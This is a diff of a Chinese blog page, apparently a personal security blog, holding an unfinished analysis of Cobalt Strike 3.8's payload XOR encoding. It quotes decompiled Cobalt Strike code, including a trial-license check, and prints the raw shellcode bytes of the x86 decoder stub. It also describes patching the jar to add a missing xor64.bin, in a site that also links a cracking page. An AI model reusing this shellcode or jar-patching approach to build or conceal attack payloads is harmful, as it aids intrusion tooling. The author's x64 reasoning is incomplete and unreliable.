@@ -8,7 +8,7 @@
   
   <meta name="author" content="c4bbage">
   
-  <title>逆向工程工具 - c4bbage blog</title>
+  <title>尝试修复cobaltstrike xor64.bin(未完成) - c4bbage blog</title>
   
 
   <link rel="shortcut icon" href="../img/favicon.ico">
@@ -23,9 +23,9 @@
   
   <script>
     // Current page data
-    var mkdocs_page_name = "逆向工程工具";
-    var mkdocs_page_input_path = "reverse_engineering_tool.md";
-    var mkdocs_page_url = "/reverse_engineering_tool/";
+    var mkdocs_page_name = "尝试修复cobaltstrike xor64.bin(未完成)";
+    var mkdocs_page_input_path = "cobaltstrike-xor.md";
+    var mkdocs_page_url = "/cobaltstrike-xor/";
   </script>
   
   <script src="../js/jquery-2.1.1.min.js"></script>
@@ -203,15 +203,8 @@
 
         
             
-    <li class="toctree-l1 current">
-        <a class="current" href="./">逆向工程工具</a>
-        
-            <ul>
-            
-                <li class="toctree-l3"><a href="#gdb-peda">gdb peda</a></li>
-                
-            
-            </ul>
+    <li class="toctree-l1 ">
+        <a class="" href="../reverse_engineering_tool/">逆向工程工具</a>
         
     </li>
 
@@ -268,8 +261,21 @@
 
         
             
-    <li class="toctree-l1 ">
-        <a class="" href="../cobaltstrike-xor/">尝试修复cobaltstrike xor64.bin(未完成)</a>
+    <li class="toctree-l1 current">
+        <a class="current" href="./">尝试修复cobaltstrike xor64.bin(未完成)</a>
+        
+            <ul>
+            
+                <li class="toctree-l3"><a href="#cobaltstrike-xorbin-xor64bin">cobaltstrike xor.bin xor64.bin 分析</a></li>
+                
+                    <li><a class="toctree-l4" href="#_1">概述</a></li>
+                
+                    <li><a class="toctree-l4" href="#_2">调用位置</a></li>
+                
+                    <li><a class="toctree-l4" href="#_3">想法</a></li>
+                
+            
+            </ul>
         
     </li>
 
@@ -313,11 +319,11 @@
     
       
         
-          <li>实用工具 &raquo;</li>
+          <li>水文 &raquo;</li>
         
       
     
-    <li>逆向工程工具</li>
+    <li>尝试修复cobaltstrike xor64.bin(未完成)</li>
     <li class="wy-breadcrumbs-aside">
       
     </li>
@@ -327,13 +333,144 @@
           <div role="main">
             <div class="section">
               
-                <p>逆向工程工具</p>
-<h2 id="gdb-peda">gdb peda</h2>
-<p>https://github.com/longld/peda</p>
+                <h1 id="cobaltstrike-xorbin-xor64bin">cobaltstrike xor.bin xor64.bin 分析</h1>
 <blockquote>
-<p>Centos 6.5/python2.6启动会有BUG
-https://github.com/longld/peda/pull/59/files</p>
+<p>未完成
+<em> 作者:c4bbage
+</em> 时间:2017.9.14
+* 链接:http://dobest1.com/cobaltstrike-xor</p>
 </blockquote>
+<h2 id="_1">概述</h2>
+<p>在cobaltstrike3.8中在资源里我们缺少xor64.bin文件，早期流传3.x中存在xor.bin不知道来自哪里(我看了下所有3.x中没有xor.bin，而且3.x的xor.bin和2.5的xor.bin并不一样)，但是这并不影响我们使用cobaltstrike。
+没有xor64.bin永远美中不足。</p>
+<h2 id="_2">调用位置</h2>
+<p>所有代码是以3.8为例</p>
+<pre><code class="java">// common.ArtifactUtils
+public static byte[] XorEncode(byte[] data, String arch)
+{
+if (License.isTrial())
+{
+    CommonUtils.print_trial(&quot;Disabled &quot; + arch + &quot; payload stage encoding.&quot;);
+    return data;
+}
+AssertUtils.Test(data.length &gt; 16384, &quot;XorEncode used on a stager (or some other small thing)&quot;);
+
+
+AssertUtils.TestArch(arch);
+if (&quot;x86&quot;.equals(arch))
+{
+    byte[] decoder = CommonUtils.pickOption(&quot;resources/xor.bin&quot;);
+    byte[] payload = XorEncoder.encode(data);
+    return CommonUtils.join(decoder, payload);
+}
+if (&quot;x64&quot;.equals(arch))
+{
+    byte[] decoder = CommonUtils.readResource(&quot;resources/xor64.bin&quot;);
+    byte[] payload = XorEncoder.encode(data);
+    return CommonUtils.join(decoder, payload);
+}
+return new byte[0];
+}
+</code></pre>
+
+<p>在x86架构中采用的是pickOption读取xor.bin，以下是调用过程及部分主要函数。</p>
+<pre><code class="java">// common.CommonUtils
+public static byte[] pickOption(String file)
+{
+    List options = readOptions(file);
+    byte[] result = (byte[])options.get(rand(options.size()));
+    return result;
+}
+// readOptions方法
+public static List readOptions(String file)
+{
+    LinkedList results = new LinkedList();
+    try
+    {
+        byte[] data = readResource(file);
+        DataInputStream in = new DataInputStream(new ByteArrayInputStream(data));
+        while (in.available() &gt; 0)
+        {
+        // 读取四个字节，并返回一个int值。文件指针后移
+        int len = in.readInt();
+        // available 判断读写操作前先得知数据流里有多少个字节可以读取
+        if (len &gt; in.available())
+        {
+            print_error(&quot;readOptions: &quot; + file + &quot; has bad length: &quot; + len + &quot; &gt; &quot; + in.available());
+            return results;
+        }
+        byte[] next = new byte[len];
+        // read()方法最多
+        in.read(next);
+        results.add(next);
+        }
+    }
+    catch (IOException ioex)
+    {
+        MudgeSanity.logException(&quot;readOptions: &quot; + file, ioex, false);
+    }
+    return results;
+}
+
+// common.CommonUtils
+public static byte[] readResource(String f)
+{
+    try
+    {
+        InputStream in = resource(f);
+        if (in != null)
+        {
+        byte[] result = readAll(in);
+        in.close();
+        return result;
+        }
+        print_error(&quot;Could not find resource: &quot; + f);
+    }
+    catch (IOException ioex)
+    {
+        MudgeSanity.logException(&quot;readResource: &quot; + f, ioex, false);
+    }
+    return new byte[0];
+}
+
+public static InputStream resource(String f)
+throws IOException
+{
+    if (new File(f).exists()) {
+        return new FileInputStream(new File(f));
+    }
+    return CommonUtils.class.getClassLoader().getResourceAsStream(f);
+}
+</code></pre>
+
+<h2 id="_3">想法</h2>
+<p>整个流程只是简单的读取文件编码文件，流程简析如下:
+- CommonUtils.pickOption("resources/xor.bin");
+- CommonUtils.readOptions()
+- CommonUtils.readResource() <code>X64 省略了前面操作</code>
+- CommonUtils.resource()</p>
+<p>我对上面的代码做了摘取，进行了调试 readResource()的结果和pickOption的结果一样。
+xor.bin x86 的数据结构是</p>
+<pre><code class="c">struct xorbin{
+    int length;
+    unsigned char shellcode[];
+};
+
+/** xir.bin 3.8 HEX数据
+0x00,  0x00,  0x00,  0x38,  0xFC,  0xE8,  0x00,  0x00,  0x00,  0x00,  0xEB,  0x2B,  0x5D,  0x8B,  0x45,  0x00,  0x83,  0xC5,  0x04,  0x8B,  0x4D,  0x00,  0x31,  0xC1,  0x83,  0xC5,  0x04,  0x55,  0x8B,  0x55,  0x00,  0x31,  0xC2,  0x89,  0x55,  0x00,  0x31,  0xD0,  0x83,  0xC5,  0x04,  0x83,  0xE9,  0x04,  0x31,  0xD2,  0x39,  0xD1,  0x74,  0x02,  0xEB,  0xE8,  0x58,  0xFF,  0xE0,  0xE8,  0xD0,  0xFF,  0xFF,  0xFF,
+// 
+0x00,  0x00,  0x00,  0x38 =&gt; 56
+*/
+</code></pre>
+
+<p>在x64 xor64.bin没有length这一位(四字节)，只有shellcode部分。
+想起以前都是用一个xor.bin，到这里了我们是不是可以干了</p>
+<pre><code>0xFC,  0xE8,  0x00,  0x00,  0x00,  0x00,  0xEB,  0x2B,  0x5D,  0x8B,  0x45,  0x00,  0x83,  0xC5,  0x04,  0x8B,  0x4D,  0x00,  0x31,  0xC1,  0x83,  0xC5,  0x04,  0x55,  0x8B,  0x55,  0x00,  0x31,  0xC2,  0x89,  0x55,  0x00,  0x31,  0xD0,  0x83,  0xC5,  0x04,  0x83,  0xE9,  0x04,  0x31,  0xD2,  0x39,  0xD1,  0x74,  0x02,  0xEB,  0xE8,  0x58,  0xFF,  0xE0,  0xE8,  0xD0,  0xFF,  0xFF,  0xFF,
+</code></pre>
+
+<p>用C32修改xor.bin数据
+把xor64.bin添加到jar中，生成64位的windows Executable，后来发现CS逻辑代码上，走不到到XorEncoder.encode(),X64系统中，也是走的x86体系的payload作为data数据，比如vncdll.x64.dll。
+就先到这里，下次分析下2.5版本的xor.bin.</p>
               
             </div>
           </div>
@@ -341,10 +478,10 @@ https://github.com/longld/peda/pull/59/files</p>
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
-        <a href="../cobalt-strike-cracked/" class="btn btn-neutral float-right" title="cobalt strike 3.7 破解">Next <span class="icon icon-circle-arrow-right"></span></a>
+        <a href="../Heart%20chicken%20soup/" class="btn btn-neutral float-right" title="心灵鸡汤">Next <span class="icon icon-circle-arrow-right"></span></a>
       
       
-        <a href="../pentest_tools/" class="btn btn-neutral" title="在渗透中需要用的工具收集"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../windows_persistence_note/" class="btn btn-neutral" title="windows后门自启动笔记"><span class="icon icon-circle-arrow-left"></span> Previous</a>
       
     </div>
   
@@ -370,10 +507,10 @@ https://github.com/longld/peda/pull/59/files</p>
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href="../pentest_tools/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href="../windows_persistence_note/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../cobalt-strike-cracked/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../Heart%20chicken%20soup/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
